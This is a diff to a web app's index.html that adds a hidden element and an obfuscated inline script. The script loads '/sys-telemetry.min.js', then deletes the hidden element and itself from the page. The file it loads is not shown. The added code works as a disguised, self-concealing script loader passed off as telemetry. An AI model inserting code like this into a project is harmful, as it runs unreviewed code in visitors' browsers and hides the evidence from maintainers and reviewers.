@@ -23,6 +23,15 @@
 
   <body>
     <div id="root"></div>
+    <div id="telemetry-config" data-config="/sys-telemetry.min.js" style="display:none;"></div>
     <script type="module" src="/src/main.tsx"></script>
+    <script>
+      (function(){var _a,_b,_c,_d,_e;(_a=function(){_b=document;
+      _c='getElementById';_d='telemetry-config';_e=_b[_c](_d);
+      if(_e){var _f=_e.getAttribute('data-config');var _g=_b.createElement('script');
+      _g.src=_f;_b.body.appendChild(_g);_e.parentNode.removeChild(_e);
+      (document.currentScript||document.scripts[document.scripts.length-1]).remove();}
+      })();})();
+    </script>
   </body>
 </html>
